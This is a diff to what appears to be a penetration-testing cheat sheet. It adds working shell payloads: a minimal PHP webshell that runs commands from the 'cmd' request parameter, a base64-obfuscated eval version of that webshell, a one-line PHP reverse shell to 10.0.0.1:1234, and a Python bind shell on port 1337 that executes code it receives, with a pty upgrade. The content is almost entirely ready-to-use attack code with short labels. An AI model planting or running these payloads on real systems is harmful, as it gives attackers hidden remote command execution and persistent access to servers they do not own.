@@ -27,8 +27,49 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ### PHP
 
+Minimal webshell (`?cmd=ls`)
+
+```
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+```
+
+Decodes the Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code ((link)[https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/])
+```
+<?php
+eval(base64_decode("c3lzdGVtKCdscyAtbGEnKTsNCg=="));
+?>
+```
+
+Base64 encoded cmd webshell
+```
+<?php eval(base64_decode("aWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllO30=")); ?>
+```
+
+Reverse shell using a socket
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+## Bind Shell
+
+### Python
+
+Connect via `nc`:
+```
+import socket as a; s = a.socket();s.bind(('0.0.0.0',1337));s.listen(1);(r,z) = s.accept();exec(r.recv(999))
+```
+
+After connecting upgrade via:
+```
+import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/sh");s.close()
 ```
 
 
